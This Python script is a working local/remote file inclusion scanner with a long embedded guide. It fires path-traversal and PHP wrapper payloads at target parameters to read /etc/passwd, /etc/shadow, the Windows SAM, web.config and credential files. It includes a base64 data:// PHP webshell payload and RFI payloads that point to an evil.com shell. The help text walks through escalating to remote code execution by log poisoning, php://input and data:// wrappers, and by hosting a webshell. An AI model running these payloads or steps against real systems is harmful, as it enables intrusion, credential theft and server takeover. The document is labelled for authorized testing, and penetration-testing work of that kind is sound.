#!/usr/bin/env python3
"""
LFI/RFI Scanner - Local/Remote File Inclusion Vulnerability Tester
For authorized security testing only

QUICK START:
    ./lfi_scanner.py -u "http://target.com/page.php?file=home"
    ./lfi_scanner.py -u "http://target.com/page.php?file=home" --rfi
    ./lfi_scanner.py -l urls.txt
"""

import argparse
import sys
import os
import re
import urllib.parse
from typing import List, Dict, Tuple, Optional
from concurrent.futures import ThreadPoolExecutor, as_completed

try:
    import requests
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
except ImportError:
    print("Error: requests library required. Install with: pip install requests")
    sys.exit(1)

# Colors
class C:
    R = '\033[91m'
    Y = '\033[93m'
    G = '\033[92m'
    B = '\033[94m'
    M = '\033[95m'
    C = '\033[96m'
    W = '\033[97m'
    E = '\033[0m'
    BOLD = '\033[1m'

# LFI Payloads
LFI_PAYLOADS = {
    'linux': [
        # Basic traversal
        '../etc/passwd',
        '../../etc/passwd',
        '../../../etc/passwd',
        '../../../../etc/passwd',
        '../../../../../etc/passwd',
        '../../../../../../etc/passwd',
        '../../../../../../../etc/passwd',
        '../../../../../../../../etc/passwd',

        # Absolute paths
        '/etc/passwd',
        '/etc/shadow',
        '/etc/hosts',
        '/etc/hostname',
        '/etc/issue',
        '/etc/group',
        '/etc/motd',
        '/proc/self/environ',
        '/proc/version',
        '/proc/cmdline',
        '/proc/self/status',
        '/proc/self/fd/0',
        '/var/log/apache2/access.log',
        '/var/log/apache2/error.log',
        '/var/log/nginx/access.log',
        '/var/log/nginx/error.log',
        '/var/log/auth.log',
        '/var/log/syslog',

        # Null byte (for older PHP)
        '../etc/passwd%00',
        '../../../../etc/passwd%00',

        # Double encoding
        '..%252f..%252f..%252fetc/passwd',
        '%2e%2e/%2e%2e/%2e%2e/etc/passwd',

        # UTF-8 encoding
        '..%c0%af..%c0%af..%c0%afetc/passwd',

        # Filter bypass
        '....//....//....//etc/passwd',
        '..../..../..../etc/passwd',
        '....\/....\/....\/etc/passwd',

        # Wrapper (PHP)
        'php://filter/convert.base64-encode/resource=/etc/passwd',
        'php://filter/read=convert.base64-encode/resource=/etc/passwd',
        'php://input',
        'expect://id',
        'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==',
    ],
    'windows': [
        # Basic traversal
        '..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
        '....\\....\\....\\....\\windows\\system32\\drivers\\etc\\hosts',

        # Absolute paths
        'C:\\Windows\\System32\\drivers\\etc\\hosts',
        'C:\\Windows\\win.ini',
        'C:\\Windows\\System32\\config\\SAM',
        'C:\\boot.ini',
        'C:\\inetpub\\logs\\LogFiles',
        'C:\\inetpub\\wwwroot\\web.config',

        # With null byte
        '..\\..\\..\\..\\windows\\win.ini%00',
    ]
}

# Detection patterns
LFI_SUCCESS_PATTERNS = {
    '/etc/passwd': r'root:.*:0:0:',
    '/etc/shadow': r'root:\$[0-9a-z]+\$',
    '/etc/hosts': r'127\.0\.0\.1\s+localhost',
    '/etc/hostname': r'^[a-zA-Z0-9\-]+$',
    '/proc/version': r'Linux version',
    '/proc/self/environ': r'PATH=|HOME=|USER=',
    'win.ini': r'\[fonts\]|\[extensions\]',
    'hosts': r'127\.0\.0\.1',
    'boot.ini': r'\[boot loader\]',
    'web.config': r'<configuration>',
    'base64': r'^[A-Za-z0-9+/]+={0,2}$',
}

HELP_TEXT = """
================================================================================
                     LFI/RFI SCANNER - COMPLETE GUIDE
================================================================================

WHAT ARE LFI AND RFI?
---------------------
File inclusion vulnerabilities occur when a web application includes files
based on user input without proper validation.

LOCAL FILE INCLUSION (LFI):
  The attacker can read files FROM THE SERVER itself.
  Example: Reading /etc/passwd, config files, source code, logs

REMOTE FILE INCLUSION (RFI):
  The attacker can include files FROM AN EXTERNAL SERVER.
  Example: Including http://evil.com/shell.txt which contains PHP code
  This is much more dangerous - it's basically instant code execution.

WHY THIS IS A CRITICAL VULNERABILITY
------------------------------------
LFI can lead to:
  • Reading sensitive files (passwords, API keys, database credentials)
  • Reading application source code (find more vulnerabilities)
  • Log poisoning → Remote Code Execution
  • Session file access → Account takeover
  • /proc/self/environ → Remote Code Execution

RFI can lead to:
  • Immediate Remote Code Execution (RCE)
  • Full server compromise
  • Installing backdoors
  • Lateral movement in the network

HOW FILE INCLUSION ACTUALLY WORKS
---------------------------------

VULNERABLE CODE EXAMPLE (PHP):
  <?php
    $page = $_GET['page'];
    include($page . '.php');
  ?>

NORMAL USE:
  URL:    http://site.com/index.php?page=about
  Server: include("about.php");
  Result: Shows the about page

LFI ATTACK:
  URL:    http://site.com/index.php?page=../../../etc/passwd%00
  Server: include("../../../etc/passwd");
  Result: Shows contents of /etc/passwd!

  The ../ sequences traverse UP the directory tree.
  The %00 (null byte) truncates the .php extension in older PHP.

RFI ATTACK:
  URL:    http://site.com/index.php?page=http://evil.com/shell
  Server: include("http://evil.com/shell.php");
  Result: Executes attacker's PHP code!

UNDERSTANDING THE PAYLOADS
--------------------------

PATH TRAVERSAL (../)
  WHAT: Uses ../ to navigate up directories to reach system files.
  HOW MANY: Depends on where the web app is. Usually 5-10 is enough.

  ../etc/passwd                     → Probably not enough
  ../../../etc/passwd               → Getting closer
  ../../../../../../etc/passwd      → Usually works
  ../../../../../../../../etc/passwd → Safe bet

  WHY IT WORKS: The ../ means "go up one directory." Enough of them
  will get you to the root (/) regardless of where you start.

NULL BYTE (%00)
  WHAT: Terminates strings in C-based languages. Older PHP was vulnerable.

  PROBLEM: Code adds .php: include($input . ".php");
  INPUT:   ../../../etc/passwd        → tries to load passwd.php (fails)
  INPUT:   ../../../etc/passwd%00     → %00 cuts off the .php extension!

  NOTE: Fixed in PHP 5.3.4+, but still worth trying on older systems.

DOUBLE ENCODING
  WHAT: URL-encode the payload TWICE to bypass filters.

  NORMAL:  ../           → ../ (might be filtered)
  ENCODED: ..%2f         → ../ (might be filtered)
  DOUBLE:  ..%252f       → gets decoded to ..%2f → then to ../

  WHY IT WORKS: Some apps decode input twice, or WAF decodes once
  but app decodes again.

PHP WRAPPERS (CRITICAL FOR PHP APPS)
  WHAT: PHP has special "wrapper" protocols that can read files in
        different ways.

  php://filter/convert.base64-encode/resource=/etc/passwd
    → Returns /etc/passwd as base64 (bypasses some filters)
    → Decode the base64 to get the file contents

  php://input
    → Reads raw POST data as the included file
    → Send PHP code in POST body → code execution!

  data://text/plain,<?php system('id'); ?>
    → Includes literal data as a file
    → Direct code execution if data:// wrapper is enabled

  expect://id
    → Executes system commands (if expect module is installed)

WHAT TO DO WITH EACH RESULT
---------------------------

[VULNERABLE] - You got file contents!
  1. Document which payload worked
  2. Note what file you could read
  3. Try to read more sensitive files (see list below)
  4. Try to escalate to code execution

[POSSIBLE] - Response is different but no clear file contents
  1. Compare response lengths between normal and payload requests
  2. Check if error messages reveal information
  3. Try different files (maybe /etc/passwd doesn't exist - Windows?)
  4. Try php://filter to base64 encode the output

[FILTERED] - Payload was blocked
  1. Try encoding variations (double encode, UTF-8)
  2. Try different traversal styles (....// or ..././ or ..\\)
  3. Try wrapper-based payloads (php://filter)
  4. Mix encodings: ..%252f..%252f

JUICY FILES TO READ (LINUX)
---------------------------
Once you have LFI, try to read these files:

SYSTEM FILES:
  /etc/passwd         → Usernames (always try first - confirms LFI)
  /etc/shadow         → Password hashes (usually not readable)
  /etc/hosts          → Internal hostnames and IPs
  /etc/crontab        → Scheduled tasks
  /proc/version       → Kernel version
  /proc/self/environ  → Environment variables (may contain secrets)
  /proc/self/cmdline  → How the process was started

WEB APPLICATION FILES:
  /var/www/html/config.php         → Database credentials
  /var/www/html/.htaccess          → Apache config, maybe auth
  /var/www/html/wp-config.php      → WordPress database creds
  /var/www/html/.env               → Environment config
  /var/www/html/app/config/database.yml  → Rails database config

LOG FILES (for log poisoning):
  /var/log/apache2/access.log      → Apache access log
  /var/log/apache2/error.log       → Apache error log
  /var/log/nginx/access.log        → Nginx access log
  /proc/self/fd/0, /proc/self/fd/1 → stdin/stdout

JUICY FILES TO READ (WINDOWS)
-----------------------------
  C:\\Windows\\win.ini                    → Confirms LFI works
  C:\\Windows\\System32\\drivers\\etc\\hosts → Host file
  C:\\inetpub\\wwwroot\\web.config        → IIS config, connection strings
  C:\\xampp\\apache\\conf\\httpd.conf     → Apache config
  C:\\xampp\\htdocs\\config.php           → App config

ESCALATING LFI TO CODE EXECUTION
--------------------------------

METHOD 1: LOG POISONING
  1. Inject PHP code into a log file (via User-Agent header)
     curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/
  2. The malicious User-Agent gets written to access.log
  3. Include the log file via LFI
     ?page=../../../var/log/apache2/access.log&cmd=id
  4. Your PHP code executes!

METHOD 2: /PROC/SELF/ENVIRON
  1. Some servers expose environment via /proc/self/environ
  2. User-Agent is often stored in HTTP_USER_AGENT env variable
  3. Inject PHP in User-Agent, then include /proc/self/environ
     curl -A "<?php system('id'); ?>" "http://target.com/?page=../../../proc/self/environ"

METHOD 3: PHP SESSION FILES
  1. Find where PHP stores sessions (usually /tmp or /var/lib/php/sessions)
  2. Your session data might be controllable
  3. Inject PHP into a form field that gets stored in session
  4. Include your session file: ?page=../../../tmp/sess_[your_session_id]

METHOD 4: PHP WRAPPERS FOR RCE
  If php://input or data:// wrappers work:

  # Using php://input (send code in POST body)
  curl -X POST -d "<?php system('id'); ?>" "http://target.com/?page=php://input"

  # Using data:// wrapper
  http://target.com/?page=data://text/plain,<?php system('id'); ?>

SCENARIO-BASED USAGE
--------------------

SCENARIO: "Quick LFI check on a PHP application"
COMMAND:  ./lfi_scanner.py -u "http://target.com/view.php?file=test" --os linux
WHY:      PHP apps commonly have LFI. Linux payloads try /etc/passwd first.
NEXT:     If vulnerable, try to read config files and escalate.

SCENARIO: "Application seems to filter ../"
COMMAND:  ./lfi_scanner.py -u "http://target.com/page?f=x" --depth 15
WHY:      Higher depth tries more ../ variations and encoding bypasses.
NEXT:     Try php://filter wrapper manually if traversal is blocked.

SCENARIO: "I want to test for RFI too"
COMMAND:  ./lfi_scanner.py -u "http://target.com/include?page=test" --rfi
WHY:      RFI is rare (requires allow_url_include=On) but devastating.
          Worth checking because it's instant RCE.
NEXT:     If RFI works, host a PHP webshell and include it.

SCENARIO: "Testing Windows server (IIS)"
COMMAND:  ./lfi_scanner.py -u "http://target.com/load.aspx?file=home" --os windows
WHY:      Uses Windows-specific paths (C:\\Windows\\, backslash, etc.)
NEXT:     Try to read web.config for connection strings.

COMMON MISTAKES TO AVOID
------------------------
❌ Only trying a few ../ levels - go deep (8-15 levels)
❌ Forgetting null byte on older PHP systems
❌ Not trying php:// wrappers on PHP apps
❌ Ignoring Windows paths when targeting IIS
❌ Giving up when basic traversal is filtered
❌ Not trying to escalate LFI to RCE

QUICK REFERENCE
---------------
./lfi_scanner.py -u "URL?param=x"                    # Basic scan
./lfi_scanner.py -u "URL" --os linux                 # Linux-only payloads
./lfi_scanner.py -u "URL" --os windows               # Windows-only payloads
./lfi_scanner.py -u "URL" --rfi                      # Test RFI too
./lfi_scanner.py -u "URL" --depth 15                 # Deep traversal
./lfi_scanner.py -u "URL" -p specificparam           # Test specific param
./lfi_scanner.py -l urls.txt                         # Batch testing

MANUAL PAYLOADS TO TRY:
  ../../../etc/passwd
  ....//....//....//etc/passwd
  ..%252f..%252f..%252fetc/passwd
  php://filter/convert.base64-encode/resource=/etc/passwd
  php://input (with POST body containing PHP)
  data://text/plain,<?php system('id'); ?>

================================================================================
"""

def banner():
    print(f"""{C.C}
    __    ________   _____
   / /   / ____/  | / ___/_________ _____  ____  ___  _____
  / /   / /_  / /| | \\__ \\/ ___/ __ `/ __ \\/ __ \\/ _ \\/ ___/
 / /___/ __/ / ___ |___/ / /__/ /_/ / / / / / / /  __/ /
/_____/_/   /_/  |_/____/\\___/\\__,_/_/ /_/_/ /_/\\___/_/
{C.E}{C.Y}Local/Remote File Inclusion Scanner{C.E}
""")

def get_payloads(os_type: str = 'both', depth: int = 8) -> List[str]:
    """Get LFI payloads based on target OS"""
    payloads = []

    if os_type in ['linux', 'both']:
        payloads.extend(LFI_PAYLOADS['linux'])

        # Add custom depth traversals
        for i in range(1, depth + 1):
            prefix = '../' * i
            payloads.extend([
                f'{prefix}etc/passwd',
                f'{prefix}etc/shadow',
                f'{prefix}var/log/apache2/access.log',
                f'{prefix}proc/self/environ',
            ])

    if os_type in ['windows', 'both']:
        payloads.extend(LFI_PAYLOADS['windows'])

        for i in range(1, depth + 1):
            prefix = '..\\' * i
            payloads.extend([
                f'{prefix}windows\\win.ini',
                f'{prefix}windows\\system32\\drivers\\etc\\hosts',
            ])

    return list(set(payloads))

def get_rfi_payloads() -> List[str]:
    """Get RFI test payloads"""
    return [
        'http://evil.com/shell.txt',
        'https://evil.com/shell.txt',
        '//evil.com/shell.txt',
        'http://127.0.0.1:80/',
        'http://localhost/',
        'file:///etc/passwd',
        'dict://localhost:11211/stats',
        'gopher://localhost:6379/_INFO',
    ]

def parse_url_params(url: str) -> Dict[str, str]:
    """Extract URL parameters"""
    parsed = urllib.parse.urlparse(url)
    return dict(urllib.parse.parse_qsl(parsed.query))

def build_url(base_url: str, params: Dict[str, str]) -> str:
    """Rebuild URL with parameters"""
    parsed = urllib.parse.urlparse(base_url)
    query = urllib.parse.urlencode(params)
    return urllib.parse.urlunparse((
        parsed.scheme, parsed.netloc, parsed.path,
        parsed.params, query, parsed.fragment
    ))

def check_lfi_success(response_text: str) -> Tuple[bool, str]:
    """Check if LFI was successful by looking for known file contents"""

    for file_pattern, regex in LFI_SUCCESS_PATTERNS.items():
        if re.search(regex, response_text, re.MULTILINE | re.IGNORECASE):
            return True, file_pattern

    # Check for base64 encoded content (from php://filter)
    base64_match = re.search(r'([A-Za-z0-9+/]{50,}={0,2})', response_text)
    if base64_match:
        try:
            import base64
            decoded = base64.b64decode(base64_match.group(1)).decode('utf-8', errors='ignore')
            if 'root:' in decoded or '<?php' in decoded:
                return True, 'base64_decoded'
        except:
            pass

    return False, ''

def test_lfi(url: str, param: str, payload: str,
             session: requests.Session, baseline_len: int) -> Optional[Dict]:
    """Test a single LFI payload"""
    try:
        params = parse_url_params(url)
        params[param] = payload

        test_url = build_url(url, params)
        response = session.get(test_url, timeout=10, verify=False)

        # Check for success
        success, matched_file = check_lfi_success(response.text)

        if success:
            return {
                'url': url,
                'parameter': param,
                'payload': payload,
                'status': 'vulnerable',
                'matched': matched_file,
                'response_length': len(response.text)
            }

        # Check for significant response length difference
        len_diff = abs(len(response.text) - baseline_len)
        if len_diff > 100 and len(response.text) > baseline_len:
            return {
                'url': url,
                'parameter': param,
                'payload': payload,
                'status': 'possible',
                'matched': 'length_diff',
                'response_length': len(response.text)
            }

    except Exception as e:
        pass

    return None

def get_baseline(url: str, param: str, session: requests.Session) -> int:
    """Get baseline response length"""
    try:
        params = parse_url_params(url)
        params[param] = 'nonexistent_file_12345'
        test_url = build_url(url, params)
        response = session.get(test_url, timeout=10, verify=False)
        return len(response.text)
    except:
        return 0

def scan_url(url: str, session: requests.Session, param: str = None,
             os_type: str = 'both', depth: int = 8, test_rfi: bool = False,
             threads: int = 10) -> List[Dict]:
    """Scan URL for LFI vulnerabilities"""
    results = []

    # Get parameters
    params = parse_url_params(url)
    if not params:
        print(f"{C.Y}[!]{C.E} No parameters found in URL")
        return results

    # Determine which param to test
    test_params = [param] if param and param in params else list(params.keys())

    # Get payloads
    payloads = get_payloads(os_type, depth)
    if test_rfi:
        payloads.extend(get_rfi_payloads())

    print(f"{C.B}[*]{C.E} Testing {len(test_params)} parameters with {len(payloads)} payloads")

    for param_name in test_params:
        print(f"\n{C.B}[*]{C.E} Testing parameter: {C.Y}{param_name}{C.E}")

        # Get baseline
        baseline = get_baseline(url, param_name, session)
        print(f"{C.B}[*]{C.E} Baseline response length: {baseline}")

        # Test payloads
        found_vuln = False
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = {
                executor.submit(test_lfi, url, param_name, payload, session, baseline): payload
                for payload in payloads
            }

            for future in as_completed(futures):
                result = future.result()
                if result:
                    results.append(result)
                    status_color = C.R if result['status'] == 'vulnerable' else C.Y
                    print(f"{status_color}[{result['status'].upper()}]{C.E} "
                          f"matched={C.C}{result['matched']}{C.E} "
                          f"payload={C.Y}{result['payload'][:50]}{C.E}")
                    found_vuln = True

        if not found_vuln:
            print(f"{C.B}[*]{C.E} No LFI found for {param_name}")

    return results

def main():
    parser = argparse.ArgumentParser(
        description='LFI/RFI Scanner - File Inclusion Vulnerability Tester',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='For authorized security testing only.'
    )

    parser.add_argument('-u', '--url', help='Single URL to test')
    parser.add_argument('-l', '--list', help='File containing URLs to test')
    parser.add_argument('-p', '--param', help='Specific parameter to test')
    parser.add_argument('--os', choices=['linux', 'windows', 'both'],
                       default='both', help='Target OS')
    parser.add_argument('--rfi', action='store_true', help='Also test for RFI')
    parser.add_argument('--depth', type=int, default=8, help='Traversal depth')
    parser.add_argument('--cookie', help='Cookie for authenticated testing')
    parser.add_argument('-t', '--threads', type=int, default=10, help='Number of threads')
    parser.add_argument('-o', '--output', help='Save results to file')
    parser.add_argument('--proxy', help='Proxy URL')
    parser.add_argument('--help-full', action='store_true', help='Show detailed help')

    args = parser.parse_args()

    if args.help_full:
        print(HELP_TEXT)
        return

    if not args.url and not args.list:
        banner()
        parser.print_help()
        print(f"\n{C.Y}Tip:{C.E} Use --help-full for detailed usage guide")
        return

    banner()

    # Setup session
    session = requests.Session()
    session.headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'

    if args.cookie:
        session.headers['Cookie'] = args.cookie

    if args.proxy:
        session.proxies = {'http': args.proxy, 'https': args.proxy}

    all_results = []

    # Get URLs
    urls = []
    if args.url:
        urls.append(args.url)
    if args.list:
        try:
            with open(args.list, 'r') as f:
                urls.extend([line.strip() for line in f if line.strip()])
        except Exception as e:
            print(f"{C.R}[!]{C.E} Error reading URL list: {e}")
            return

    # Scan URLs
    for url in urls:
        print(f"\n{C.B}[*]{C.E} Target: {C.Y}{url}{C.E}")
        print(f"{C.B}[*]{C.E} " + "=" * 50)

        results = scan_url(
            url, session,
            param=args.param,
            os_type=args.os,
            depth=args.depth,
            test_rfi=args.rfi,
            threads=args.threads
        )
        all_results.extend(results)

    # Summary
    print(f"\n{C.M}[Summary]{C.E}")
    vuln_count = sum(1 for r in all_results if r['status'] == 'vulnerable')
    possible_count = sum(1 for r in all_results if r['status'] == 'possible')

    print(f"{C.R}[!]{C.E} Confirmed Vulnerable: {C.R}{vuln_count}{C.E}")
    print(f"{C.Y}[!]{C.E} Possibly Vulnerable: {C.Y}{possible_count}{C.E}")

    # Save output
    if args.output and all_results:
        with open(args.output, 'w') as f:
            f.write("LFI/RFI Scanner Results\n")
            f.write("=" * 50 + "\n\n")

            for r in all_results:
                f.write(f"URL: {r['url']}\n")
                f.write(f"Parameter: {r['parameter']}\n")
                f.write(f"Status: {r['status']}\n")
                f.write(f"Payload: {r['payload']}\n")
                f.write(f"Matched: {r['matched']}\n")
                f.write("-" * 30 + "\n")

        print(f"\n{C.B}[*]{C.E} Results saved to {args.output}")

if __name__ == '__main__':
    main()
